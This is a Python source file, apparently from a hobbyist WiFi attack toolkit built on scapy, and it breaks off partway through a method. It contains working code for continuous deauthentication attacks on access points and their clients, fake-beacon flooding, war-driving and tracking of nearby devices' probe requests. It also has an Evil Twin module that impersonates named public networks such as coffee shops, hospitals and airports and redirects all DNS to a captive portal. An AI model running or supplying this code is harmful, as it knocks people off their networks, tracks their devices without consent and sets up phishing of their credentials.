# THIS WILL BE FOR WiFi LOGIC


# NETWORK IMPORTS
import socket
from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC, wrpcap, Ether, ARP, srp
from scapy.layers.eap import EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp


# ETC IMPORTS 
import threading, os, random, time, subprocess, json
from pathlib import Path
from http.server import SimpleHTTPRequestHandler, HTTPServer
from textwrap import dedent
from datetime import datetime


# NSM IMPORTS
from nsm_vars import Variables
from nsm_database import DataBase, Background_Threads


# CONSTANTS
#mcp    =  Variables.mcp
LOCK     = Variables.LOCK
console  = Variables.console
DataBase = DataBase.WiFi



class WiFi():
    """This will house logic for WiFi"""


    # ADDR1 == DST
    # ADDR2 == SRC
    # ADDR3 == SRC


    ssids      = []
    ssid_info  = []
    ssid_false = 0


   

    @classmethod
    def _packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""

        def parser(pkt):

            c2 = "bold red"
            c4 = "bold green"


            # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
            if pkt.haslayer(Dot11Beacon):
                addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

                ssid  = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
                if not ssid: f"Missing_SSID_{cls.ssid_false}"; cls.ssid_false += 1
                vendor     = DataBase.get_vendor_main(mac=addr2)
                channel    = DataBase.get_channel(pkt=pkt)
                rssi       = DataBase.get_rssi(pkt=pkt)
                encryption = DataBase.get_encryption(pkt=pkt)
                frequency  = DataBase.get_frequency(freq=pkt[RadioTap].ChannelFrequency)
                

                """
                # THIS IS HERE JUST TO BE HERE FRL
                if addr1 not in cls.macs and addr1 != False:
                    # ADD MAC                              # ENCRYPTION, FREQUENCY -- RSSI
                    cls.beacons.append((ssid, addr1, vendor, encryption, frequency, channel, rssi))
                    cls.macs.append(addr1)
                    cls.num += 1

                    # NOW TO OUTPUT RESULTS
                    console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr1}  -  {channel}")
                """


                # BEACON == AP FRAMES ONLY
                if addr2 not in cls.macs:
     
                    cls.ssids.append(ssid)
                    cls.ssid_info[len(cls.ssids)] = {
                        "rssi": rssi,
                        "ssid": ssid,
                        "bssid": addr2,
                        "encryption": encryption,
                        "channel": channel,
                        "frequency": frequency,
                        "vendor": vendor
                    }
    
                    console.print(f"[{c2}][+] Found SSID:[{c4}] RSSI: {rssi} - {ssid} <-> {addr2} |  Encryption: {encryption} - Channel: {channel} - Frequency: {frequency} - Vendor: {vendor}")  

        threading.Thread(target=parser, args=(pkt,), daemon=True).start()
    
 
    @staticmethod
    def network_scan_arp(subnet="192.168.1.0/24"):
        """
        Scan the local network using ARP to find all active devices.

        Use this when the user asks to:
        - "scan my network" or "ARP scan"
        - "find devices on the network"
        - "what devices are connected"
        - "show me network devices"

        This is an ARP scan that discovers IP-connected devices (computers, phones, smart devices).
        For WiFi networks use sniff_for_ssids(). For Bluetooth use scan_bluetooth().

        Returns a dict with device info: IP address, MAC address, hostname, vendor
        """


        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold yellow"
        devices = {}; num = 0

        console.print("\n[bold green][+] Starating network scan.")


        try:

            arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet))


            response = srp(arp, timeout=5, verbose=0)[0]
        


            for sent, recv in response:

                target_ip = recv.psrc
                target_mac = recv.hwsrc


                host = DataBase.get_host_name(target_ip=target_ip)
                vendor = DataBase.get_vendor_main(mac=target_mac)

                devices[num] = {
                    "target_ip": target_ip,
                    "target_mac": target_mac,
                    "host": host,
                    "vendor": vendor
                }; num += 1

                console.print(f"{num} - {target_ip} <-> {target_mac} | {host} - {vendor}")
            

            return devices
    

        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); return False
    
    

"""
SSID SNIFF
CLIENTS FROM SSID

DEAUTH SSID
DEAUTH SPECIFIC CLIENTS ON SSID

// REMASTERED <-- Frame_Snatcher
"""


# REMASTERED <-- Frame_Snatcher
class SSID_Sniffer():
    """This will be responsible for only sniffing for ssids // Remastered <-- Frame_Snatcher"""

    
    ssids = []
    macs  = []
    num = 0


    @classmethod
    def _packet_parser(cls, pkt, table):
        """This method will be called upon to then parse the given packet"""


        
        def parser(pkt):


            # COLORS
            c1 = "bold yellow"
            c2 = "bold red"
            c3 = "bold blue"
            c4 = "bold green"

            
        
            # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
            if pkt.haslayer(Dot11Beacon):


                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
                addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False
                

                vendor = DataBase.get_vendor_main(mac=addr2)
                channel = DataBase.get_channel(pkt=pkt)
                rssi = DataBase.get_rssi(pkt=pkt)
                encryption = DataBase.get_encryption(pkt=pkt)
                frequency = DataBase.get_frequency(freq=pkt[RadioTap].ChannelFrequency)



                
                with LOCK:
                    # BEACON == AP FRAMES ONLY           
                    if addr2 not in cls.macs and addr2:

                
                        cls.macs.append(addr2); cls.ssids.append(ssid)
                        cls.num += 1

                        table.add_row(f"{cls.num}", f"{rssi}", f"{ssid}", f"{addr2}", f"{vendor}", f"{encryption}", f"{frequency}", f"{channel}")
            

        threading.Thread(target=parser, args=(pkt,), daemon=True).start()
            

    @classmethod
    def sniffer(cls, iface, table, timeout=15, verbose=0):
        """This will sniff for ssids"""



        while len(cls.ssids) < 1:

            console.print(f"\n[bold yellow][!] SSID Sniff starting...\n")
            sniff(iface=iface, store=0, count=0, timeout=timeout, prn=lambda pkt: SSID_Sniffer._packet_parser(pkt, table), verbose=verbose)


        console.print(f"[bold green][+] Found:[yellow] {cls.ssids} SSIDs")


    @staticmethod
    def main():
        """This will launch class wide logic"""

        iface   = Variables.iface
        timeout = Variables.timeout
        table   = Variables.table
        table.add_column("Key", style="bold red")
        table.add_column("RSSI", style="red")
        table.add_column("SSID", style="bold blue")
        table.add_column("Mac", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Encryption")
        table.add_column("Frequency")
        table.add_column("Channel")



        SSID_Sniffer.sniffer(iface=iface, table=table, timeout=timeout)


# REMASTERED <-- Frame_Snatcher
class Client_Sniffer():
    """This class will be responsible for sniffing clients off specific networks"""


    clients = []

    
    @staticmethod
    def _small_deauth(iface, target, verbose=1):
        """Send a deauth packet and sniff the reconnected macs"""

        sent = 0

        time.sleep(3)


        while sent < 10:


            reasons = random.choice([4,5,7,15])
            frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
            

            sendp(frame, iface=iface, count=15, realtime=False,verbose=False); time.sleep(1)

            sent += 1

            if verbose: console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")
    

    @classmethod
    def _packet_parser(cls, pkt, target, table):
        """This will parse packets"""


        try:

            if pkt.haslayer(Dot11):

                
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False


                if addr1 == target or addr2 == target:

                    

                    if addr1 != target and addr1 not in cls.clients and addr1:

                        vendor = DataBase.get_vendor_main(mac=addr1)
                        cls.clients.append(addr1)

                        table.add_row(f"{len(cls.clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                    elif addr2 != target and addr2 not in cls.clients and addr2:

                        vendor = DataBase.get_vendor_main(mac=addr2)
                        cls.clients.append(addr2)

                        table.add_row(f"{len(cls.clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")


        except KeyboardInterrupt as e: console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
        except Exception as e: console.print(f"[bold red]Exception Error:[yellow] {e}")


    

    @classmethod
    def _sniff_the_target(cls, iface, table, target, channel):
        """This will sniff only from target"""

        try:

         
            sniff(iface=iface, prn=lambda pkt: Client_Sniffer._packet_parser(pkt, target, table), store=0, count=0); time.sleep(1.1)
    

        except KeyboardInterrupt as e:  console.print(f"[bold red]Exception Error:[bold yellow] {e}")
        except Exception as e:console.print(f"[bold red]Exception Error:[bold yellow] {e}")


    
    @staticmethod
    def main():
        """This will be responsible for controlling class wide logic"""

        
        table      = Variables.table    
        iface      = Variables.iface
        channel    = Variables.channel
        mac_client = Variables.mac_client


        table.title = (f"{mac_client} - Client list")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")
        

        Background_Threads.channel_hopper(set_channel=channel)

        threading.Thread(target=Client_Sniffer._small_deauth, args=(iface, mac_client), daemon=True).start()
        Client_Sniffer._sniff_the_target(iface=iface, table=table, target=mac_client, channel=channel)


# REMASTERED <-- Frame_Snatcher
class Deauth_Attacker():
    """This class will be responsible for allowing user to perform a deauth attack one a ssid and or specific clients on said ssid // Remastered <-- Frame_Snatcher"""



    @staticmethod
    def _craft_packet(mac_src, mac_dst, reasons):
        """This will be used to craft deauth packets"""

        
        pkts = []
        
        for reason in reasons:
            packet = Dot11(addr1=mac_dst, addr2=mac_src, addr3=mac_src) / Dot11Deauth(reason=reason)
            pkts.append(packet)

        
        console.print(f"\n[yellow][+] Deauth Packets created!\n")
        return pkts
    

    @staticmethod
    def _sender(pkts, iface, inter, loop, count, realtime, verbose=0):
        """This will be responsible for sending deauth packets"""


        while True: 
            sendp(x=pkts, inter=inter, loop=loop, count=count, verbose=verbose, realtime=realtime, iface=iface); console.print(f"[bold green][+] Packets sent")
            
            if not inter and not loop: time.sleep(1)


    @staticmethod
    def main():
        """This method will run this class"""


        iface = Variables.iface
        channel = Variables.channel

        mac_src = Variables.mac_src
        mac_dst = Variables.mac_dst

        inter    = Variables.inter 
        loop     = Variables.loop
        count    = Variables.count
        realtime = Variables.realtime

        reasons = Variables.reasons
        
        verbose = Variables.verbose
        

        Background_Threads.channel_hopper(set_channel=channel)

        pkts = Deauth_Attacker._craft_packet(mac_src=mac_src, mac_dst=mac_dst, reasons=reasons)
        Deauth_Attacker._sender(pkts=pkts, iface=iface, inter=inter, loop=loop, count=count, realtime=realtime,verbose=verbose)
   

# REMASTERED
class Beacon_Flooder():
    """This class will be responsible for creating and flooding fake APs to nearby devices"""
    

    # CLASS VARS
    trolling_ssids = [
            "FBI_Surveillance_Van",
            "PrettyFlyForAWiFi",
            "ItHurtsWhenIP",
            "DropTablesWiFi;",
            "Virus_AP_DoNotConnect",
            "NSA_CoffeeShop",
            "404_WiFi_Not_Found",
            "Free_Vbucks_5GHz",
            "TellMyWiFiLoveHer",
            "Barii_Hacking_You",
            "LAN_of_the_Free",
            "WuTangLAN",
            "C:\Virus.exe",
            "Give_Us_Your_Data",
            "Pay4WiFi_Loser",
            "Open_AP_Honeypot",
            "DefinitelyNotAScam",
            "Connect_And_Cry",
            "Skynet_Online",
            "Free_Crypto_Mining"
        ]
    
    # f
    christmas_ssids = [
            "MerryChristmas",
            "Merry_Christmas",
            "MerryChristmas_WiFi",
            "MerryChristmas_Guest",
            "MerryChristmas24",
            "MerryChristmasNet",
            "MerryChristmasLAN",
            "MerryChristmasHome",
            "MerryChristmas_AP",
            "MerryChristmas_Free",

            "MerryXmas",
            "Merry_Xmas",
            "MerryXmas_WiFi",
            "MerryXmas_Guest",
            "MerryXmas24",
            "MerryXmasNet",

            "HappyHolidays",
            "Happy_Holidays",
            "HappyHolidays_WiFi",
            "HappyHolidays_Guest",

            "ChristmasWiFi",
            "Christmas_WiFi",
            "ChristmasGuest",
            "Christmas24"
        ]


    
    def __init__(self):
        pass



    @classmethod
    def _choose_ssid_type(cls, choice):
        """This metod will allow the user to choose the type of ssid list to advertise"""


        ssids = []

        while True:

            try:

                if choice == "1": return   cls.trolling_ssids
                elif choice == "2": return cls.christmas_ssids
                elif choice == "3":
                    
                    if not choice: raw = console.input("\n\n[bold yellow]Enter custom ssids: ").strip()
                    else: raw = choice.strip()

                    clean = (raw.split(',')) 
                    for c in clean: ssids.append(c) if c != "," else ''
                    return ssids
                
                
                else: console.print("[bold red]Input a valid option for beacon flooding goofy jhit!")
            
            except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); input()
        

    @classmethod
    def get_bssid(cls, type):
        """This method will create a bssid"""


        # 1 == RANDOM
        if type == 1:
            mac = str(RandMAC())
            parts = mac.split(':')
            # Force unicast (bit 0 = 0) and locally administered (bit 1 = 1)
            first_octet = (int(parts[0], 16) & 0xFE) | 0x02
            return "%02x:%s" % (first_octet, ':'.join(parts[1:]))

        elif type == 2: return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

        pass


    
    @classmethod
    def get_frames(cls, amount, ssid_type, bssid_type, client="ff:ff:ff:ff:ff:ff"):
        """This method will create the frame"""


        # VAR
        frames = []
        verbose = True
        print("\n\n")

        
        # DEAPPRECIATED // TERRIBLE LOGIC LOL
        if ssid_type == 99:
            while amount >= 0:


                # GET SSID
                ssid =  ssid_type

                # GET BSSID
                bssid = Beacon_Flooder.get_bssid(type=bssid_type)


                # CRAFT FRAME
                dot11 = Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid)
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
                dsset = Dot11Elt(ID="DSset", info=b'\x06')
                rates = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
                frame = RadioTap()/dot11/beacon/essid/dsset/rates


                # APPEND AND GO
                frames.append(frame)

                amount -= 1


                if verbose:
                    console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")
            

        else:            

            seq = 0
            for ssid in ssid_type:

                bssid = Beacon_Flooder.get_bssid(type=bssid_type)


                frame = (
                    RadioTap() /
                    Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid, SC=(seq << 4)) /
                    Dot11Beacon() /
                    Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                )


                frames.append(frame)
                seq = (seq + 1) % 4096  # Sequence wraps at 4096


                if verbose:console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")

            print('\n'); return frames


                

        
        # NOW RETURN THE LIST OF FRAMES
        return frames
    
   

    @classmethod
    def frame_injector(cls, iface, frames, panel, count=1):
        """This method will inject the frames into the network"""


        # VARS
        sent = 0
        down = 5
        c1 = "bold red"

        panel.renderable=f"Launching Attack in {down}"
        with Live(panel, console=console, refresh_per_second=Variables.refresh_per_second):



            while down != 0: panel.renderable = f"Launching Attack in {down}"; time.sleep(1); down -= 1


            while True:
                try:
                    sendp(frames, verbose=0, iface=iface);  sent += count * len(frames)
                    panel.renderable = (
                        f"[{c1}]Targets:[/{c1}] {len(frames)}  -  " 
                        f"[{c1}]Frames Sent:[/{c1}] {sent}  -  " 
                        )
                    
                    time.sleep(0.1)
                    


                except KeyboardInterrupt as e:
                    console.print(f"ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")

                    try:   time.sleep(0.5); break
                    except KeyboardInterrupt as e: console.print("STOP PRESSING CTRL + C", style="bold yellow")


                
                except Exception as e:
                    console.print(e)
                    
                    if down < 3: down += 1
                    elif down == 4: console.print("[bold red]MAX ERRORS OCCURED: 4"); time.sleep(2); break



    @classmethod
    def main(cls):
        """This is where class wide logic will be performed from"""


        iface  = Variables.iface
        panel  = Variables.panel
        choice = Variables.portal_num

        
        try:


            Background_Threads.channel_hopper(set_channel=int(6)); time.sleep(0.2)

            ssid_type = Beacon_Flooder._choose_ssid_type(choice=choice)
            frames = Beacon_Flooder.get_frames(ssid_type=ssid_type, bssid_type=1, amount=15)
            Beacon_Flooder.frame_injector(iface=iface, frames=frames, panel=panel)

            console.print(frames)

        except KeyboardInterrupt as e: console.print(e) 
        except Exception as e: console.print(f"[bold red]Exception Error:[yellow] {e}")


# REMASTERED
class War_Driving():
    """This class will be responsible for allowing the user to war drive"""


    mode = 0
    ssid_none = 0


    def __init__(self):
        pass

    

    @classmethod
    def data_assist(cls, panel):
        """This method will be responsible for updating panel values"""


        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold blue"
        c4 = "bold purple"

        
        with Live(panel, console=console, refresh_per_second=1, screen=False):
           while cls.LIVE:

                try:     
                    if cls.LIVE:       

                        time.sleep(1)
                        panel.renderable = (f"[{c1}]Channel:[/{c1}] {Background_Threads.channel}   -   [{c1}]AP's Found:[/{c1}] {len(cls.beacons)}   -   [{c1}]Clients Found:[/{c1}] {len(cls.macs)}   -   [bold green]Developed by NSM Barii")

                        for ap in cls.beacons:
                            if ap in cls.macs: cls.macs.remove(ap); console.print(f"[bold yellow][-][/bold yellow] Removed AP from Client list --> {ap}", style="bold yellow")
                        

                except KeyboardInterrupt as e: console.print("Now escaping the MATRIX", style="bold red"); cls.LIVE = False; break
                except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); cls.LIVE = False; break

   
    @classmethod
    def war_drive(cls, panel, iface="wlan0", verbose=0):
        """This will begin the sniffing function"""



        attempts = 0
        threading.Thread(target=War_Driving.data_assist, args=(panel, ), daemon=True).start()

        
        while cls.LIVE:
            try:

                attempts += 1; console.print(f"Sniff Attempt #{attempts}", style="bold yellow")

                sniff(iface=iface, prn=War_Driving.packet_parser , store=0); time.sleep(1)

                
            except KeyboardInterrupt as e: console.print(e); cls.LIVE = False; break
            except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); cls.LIVE = False; time.sleep(1)


    @classmethod
    def packet_parser(cls, pkt, verbose=True):
        """This method will parse packets"""


        def parser(pkt):

            
            if pkt.haslayer(Dot11Beacon) and cls.mode == 1:


                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

                

                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr1 and addr1 not in cls.macs:


                    cls.macs.append(addr1)

                    signal = DataBase.get_rssi(pkt=pkt, format=True)
                    vendor = DataBase.get_vendor(mac=addr2)                      
                    signal = f"[bold red]Signal:[/bold red] {signal}"  


                    
                    if ssid: use = f"{signal}  [bold red]Vendor:[bold yellow] {vendor}  [bold red]SSID:[/bold red] {ssid}"
                    elif vendor: use = f"signal{signal}  [bold red]Vendor:[bold yellow] {vendor}"
                    else: use = f"{signal}"

                    if verbose: console.print(f"[bold cyan][+] Found AP?:[/bold cyan] {addr1}   {use}", style="bold yellow")


                
                # AP's ONLY 
                if addr2 and addr2 not in cls.beacons:

                    
                    cls.beacons.append(addr2)

                    signall = DataBase.get_rssi(pkt=pkt, format=True)
                    vendor = DataBase.get_vendor(mac=addr2)                      
                    signal = f"[bold red]Signal:[/bold red] {signall}"  


                    
                    if ssid: use = f"{signal}  [bold red]Vendor:[bold yellow] {vendor}  [bold red]SSID:[/bold red] {ssid}"
                    elif vendor: use = f" {signal}  [bold red]Vendor:[bold yellow] {vendor}"
                    else: use = f"{signal}"


                    cls.aps[len(cls.aps)] = {
                        "ssid":ssid, 
                        "bssid": addr2, 
                        "vendor": vendor,
                        "encryption": "WPA2", 
                        "signal": signall,
                        "lat": 21,
                        "long": 34
                    }

                    if verbose: console.print(f"[bold cyan][+] Found AP:[/bold cyan] {addr2}   {use}", style="bold yellow")



            
            # FOR CLIENTS AND NON BEACON FRAMES
            elif pkt.haslayer(Dot11) and cls.mode==2:


                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False
                

                

                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr1 and addr1 not in cls.macs and addr1 not in cls.beacons:



                    cls.macs.append(addr1)
                                
                    signal = DataBase.get_rssi(pkt=pkt, format=True)
                    vendor = DataBase.get_vendor(mac=addr2)  
                    signal = f"[bold red]Signal:[/bold red] {signal}"  

                    if vendor: use = f"[bold red]Vendor:[bold yellow] {vendor}  {signal}"
                    else: use = f"{signal}"

                    if verbose: console.print(f"[bold red][+] Found Mac Addr:[bold yellow] {addr1}   {use}", style="bold yellow")


                
                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr2 and addr2 not in cls.macs and addr2 not in cls.beacons:

 
                    cls.macs.append(addr2)

                    signal = DataBase.get_rssi(pkt=pkt, format=True)
                    vendor = DataBase.get_vendor(mac=addr2)  
                    signal = f"[bold red]Signal:[/bold red] {signal}"  

                    if vendor: use = f"[bold red]Vendor:[bold yellow] {vendor}  {signal}"
                    else: use = f"{signal}"

                    if verbose:  console.print(f"[bold red][+] Found Mac Addr:[bold yellow] {addr2}   {use}", style="bold yellow")


            War_Driving.track_clients(pkt)

        threading.Thread(target=parser, args=(pkt, ), daemon=True).start()
     
    
    @classmethod
    def track_clients(cls, pkt):
        """This method will be responsible for tracking clinets that are in the client list"""


        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold purple"
        c4 = "bold yellow"
        c5 = "bold cyan"


        # INFO
        # ADDR1 == DST, ADDR2 == SRC


        if pkt.haslayer(Dot11ProbeReq):


            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
            addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
            addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False
 
            

            if addr2 and ssid:


                if addr2 not in cls.probes: cls.probes[addr2] = []; console.print(f"make --> {addr2}")


                vendor = DataBase.get_vendor_main(mac=addr2)
                sd = f"[{c4}]{addr2}   [{c1}]Vendor:[/{c1}] {vendor}[/{c4}]  -->  [{c3}]{ssid}"

                
                if ssid not in cls.probes[addr2]:


                    with LOCK:

                        console.print(f"[{c2}][+] Probe Detected:[/{c2}] {sd}")
                        cls.probes[addr2].append(ssid)

                
            
            # WILL BE REFRACTORING THIS CODE SOON
            use =  False
            if use:
                if addr2 and addr2 in cls.macs:

                    if addr2 not in cls.probes: cls.probes[addr2] = []; console.print(f"make --> {addr2}")
                    
                    vendor = DataBase.get_vendor_main(mac=addr2)
                    try:ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
                    except Exception: ssid = False
                    sd = f"[{c4}]{addr2}   [{c1}]Vendor:[/{c1}] {vendor}  -->  {ssid}"

                    
                    if ssid:

                        if addr2 not in cls.probes: cls.probes[addr2] = []; console.print(f"make --> {addr2}")
                        if ssid not in cls.probes[addr2]: cls.probes[addr2].append(ssid); console.print(f"[{c2}][+] Probe Detected:[/{c2}] {sd}")
            

    @classmethod
    def main(cls, mode=1):
        """This will be in charge of running class wide logic"""


        # SET VARS
        cls.probes = {}
        cls.macs = []
        cls.beacons = []
        cls.LIVE = True
        cls.mode = mode


        # WAR DRIVER
        cls.aps = {}

        iface = Variables.iface
        panel = Variables.panel

 
        try:

            Background_Threads.channel_hopper(verbose=False)
            War_Driving.war_drive(panel=panel, iface=iface)
            

        except KeyboardInterrupt as e:console.print(e)
        except Exception as e:console.print(f"[bold red]Exception Error:[bold yellow] {e}")


# REMASTERED
class Evil_Twin():
    """This module will allow a user to perform a (passive) Evil Twin attack"""


    @classmethod
    def _choose_portal(cls, choice=1) -> str:
        """Dictionary of Evil_Twin portals to choose from"""

        portals = {
            1: "LA Fitness",
            2: "Starbucks WiFi",
            3: "Airport_Free_WiFi",
            4: "Marriott_Guest",
            5: "SUBWAY_Free_WiFi",
            6: "McDonalds_Free_WiFi",
            7: "Target Guest WiFi",
            8: "Walmart WiFi",
            9: "Hospital_Guest",
            10: "Public_Library_WiFi",
            11: "Campus_WiFi",
            12: "Panera WiFi",
            13: "BestBuy_Guest",
            14: "CORP_Guest_WiFi",
            15: "Hilton_Honors",
            16: "Delta Sky Club",
            17: "Apple Store",
            18: "YMCA_Member_WiFi",
            19: "Whole_Foods_WiFi",
            20: "CVS WiFi"
        }
        max = 20 # git push

        #console.print(portals)

        
        while True:
            try:
                choice = int(choice)
                if 1 <= choice <= max: portal=f"portal_{choice}"; console.print(f"[bold green][+] Evil Twinning --> {portals[choice]}"); return portal, portals[choice]  

            
            except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
            

            except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")


    @classmethod
    def _get_portal_path(cls, portal:int):
        """This will be used to get the path of the portal to use"""


        # TEMP FIX FOR FILE CRASHING WITHOUT SUDO
        try:
            USER_HOME = Path(os.getenv("SUDO_USER") and f"/home/{os.getenv('SUDO_USER')}") or Path.home()
            BASE_DIR = USER_HOME / "Documents" / "nsm_tools" / "netcracker" 
        except Exception as e: 

            console.print(e)
            # SWITCH BACK TO PATH
            BASE_DIR = Path.home() / "Documents" / "nsm_tools" / "netcracker";  BASE_DIR.mkdir(exist_ok=True, parents=True)
        
        PORTAL_DIR =  BASE_DIR / "portals";                                 PORTAL_DIR.mkdir(exist_ok=True, parents=True)


        return PORTAL_DIR, Path(BASE_DIR / "portals" / portal)


    @staticmethod
    def _kill_processes(color="bold red", delay=1):
        """This method will kill any old and up and running processes"""

        console.print(f"[{color}][*] Killing existing hostapd/dnsmasq processes")
        subprocess.run(["pkill", "hostapd"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "dnsmasq"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(delay)
  

    @classmethod
    def _configure_interface(cls, iface, gateway_ip="10.0.0.1"):
        """This will configure IP for evil twin"""
        
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True)
        subprocess.run(["ip", "addr", "flush", "dev", iface], check=True)
        subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", iface], check=True)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True)

        result = subprocess.run(["ip", "addr", "show", iface],
                              capture_output=True, text=True)
        
        if gateway_ip not in result.stdout: console.print(f"[bold red][!] Failed to set IP on {iface}"); return False

        console.print(f"[bold green][+] Configured {iface} with IP 10.0.0.1")
    

    @classmethod
    def _create_hostapd_conf(cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True):
        """This will create hostpad_conf"""


        try:

            data_hostapd = dedent(
                f"""
                interface={iface}
                driver=nl80211
                ssid={ssid}
                hw_mode=g
                channel={channel}
                macaddr_acl=0
                auth_algs={auth_algs}
                ignore_broadcast_ssid=0
                """
            ).strip(); what = "hostapd_config"


            with open(path, "w") as file: file.write(data_hostapd)
            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
            return path
        

        except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
    
  
    @classmethod
    def _create_dnsmasq_conf(cls, path, iface, dhcp_range_start="10.0.0.10", dhcp_range_end="10.0.0.100", gateway_ip="10.0.0.1", 
                            dnsmasq_log="/var/log/dnsmasq_evil.log", dnsmasq_leases="/var/lib/misc/dnsmasq.leases",
                            verbose=True):
        """This will create dnsmasq_conf"""


        try:

            data_dnsmasq = dedent(
            f"""
            interface={iface}
            bind-interfaces
            listen-address={gateway_ip}

            # DHCP
            dhcp-range={dhcp_range_start},{dhcp_range_end},12h
            dhcp-option=3,{gateway_ip}
            dhcp-option=6,{gateway_ip}
            dhcp-authoritative

            # DNS - Redirect ALL domains to our portal (wildcard)
            address=/#/{gateway_ip}
            no-resolv
            no-hosts

            # Logging
            log-dhcp
            log-queries
            log-facility={dnsmasq_log}

            # Lease file
            dhcp-leasefile={dnsmasq_leases}
                """).strip(); what = "dnsmasq.conf"


            with open(path, "w") as file: file.write(data_dnsmasq)
            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
            return path


        except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")


    @classmethod
    def _start_hostapd(cls, path:str, verbose=True):
        """This will launch hostapd"""


        proc = subprocess.Popen(
            ["hostapd", path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        time.sleep(3)

        if proc.poll() is not None:
            console.print("[bold red][!] hostapd failed to start")
            _, err = proc.communicate()
            console.print(f"[bold red][-]Error: {err.decode()}")
            return False

        if verbose: console.print(f"[bold green][+] Successfully started:[bold yellow] hostapd"); return True
    

    @classmethod
    def _start_dnsmasq(cls, path: str, verbose=True):
        """This will launch dnsmasq using /etc/dnsmasq.d/ so it doesn’t hit permission denied"""

        result = subprocess.run(
            ["dnsmasq", "-C", path],
            capture_output=True,
            text=True
        )

        if result.returncode != 0: console.print(f"[bold red][!] dnsmasq failed:[bold yellow] {result.stderr}"); return False

        time.sleep(1); check = subprocess.run(["pgrep", "dnsmasq"], capture_output=True)

        if check.returncode != 0: console.print("[bold red][!] dnsmasq not running");                            return False

        pid = check.stdout.decode().strip()
